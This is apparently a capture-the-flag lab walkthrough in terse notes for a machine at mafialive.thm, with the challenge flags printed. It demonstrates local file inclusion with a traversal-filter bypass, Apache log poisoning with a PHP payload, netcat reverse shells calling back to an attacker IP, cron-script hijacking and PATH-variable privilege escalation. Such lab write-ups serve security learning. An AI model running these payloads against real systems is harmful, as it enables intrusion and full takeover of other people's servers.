IP: 10.10.34.67
Open Ports:
	22, 80

Enumerate 80:
	Homepage: Simple template
		mail : support@mafialive.thm
		new hostname : mafialive.thm

Check the new hostname:
	Add the hostname to hosts file
	Check the url mafialive.thm
	We found a flag : thm{f0und_th3_r1ght_h0st_n4m3}

Lets search this for directories:
	We found a robots.txt
	We found an entry for Disallow : /test.php

Lets check that page:
	It says test pays not to be deployed
	It has a button which will trigger a get request with input parameter 'view' to render mrrobot.php from development testing directory
	
So it is including local files.
Lets enumerate that with burp.
	Lets check for /etc/passwd : This is not allowed
	Lets try to read the test file itself.
		We not view the file itself as php is executing the page.
	Lests try to read it as base64:
		http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
	We got a long base64 string.
	Lets check that:
		We found a flag : thm{explo1t1ng_lf1}
		Also we can not use ../.. and our query must start from /var/www/html/development_testing/

	Lets use // to bypass ../.. filter and try to read /etc/passwd

	view=/var/www/html/development_testing/..//..//..//..//etc/passwd

	We can read the etc/passwd file:
		We found user : archangel
	Using same technique lets try to get user flag
		view=/var/www/html/development_testing/..//..//..//..//home/archangel/user.txt
	We got the flag : thm{lf1_t0_rc3_1s_tr1cky}

Lets use this lfi for rce
	Lets see other important server log files.
	
	view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log

	We can see the apache access log. this records user agent.
	Lets see if we can manipulate this field for RCE
	
	
	<?php echo '<script>alert(2)</script>'; ?>
	This works, now lets send a reverse shell instaed

	<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.241.177 4444 >/tmp/f') ?>

	Setup the listener and request access.log file again.

	We got a shell, convert this to python shell and lets upload and run linpeas

	We found a cron job running every min
		*/1 *   * * *   archangel /opt/helloworld.sh

	Lets check its permissions.
		We have write permissions to the file.

	Lets use it to get a reverse shell as archangel
		echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.241.177 1234 >/tmp/f' > /opt/helloworld.sh

	Lets wait for a min to let the cron job run.

	We got a shell as archangel.


Lets enumerate:
	We can navigate to the secret directory.
	We got the second user flag : thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
	We also have a backup file.
	Lets check its permissions
		-rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup
	So it is an executable, lets see what it does also the owner ie root and it belong to root group.
	We can use strings for the same
	We found that it copies the files from myfiles directories to opt directory

		cp /home/user/archangel/myfiles/* /opt/backupfiles

	It is using cp but it is not using full path, we can exploit this by creating a cp executable in /tmp directory and adding /tmp to path and running this executable from there

		echo '/bin/bash' > cp
		chmod 777 cp
		export PATH=/tmp:$PATH
		~/secret/backup

	We got the root shell, lets check for the flag in root directory.
	We found the flag : thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
!!!
	
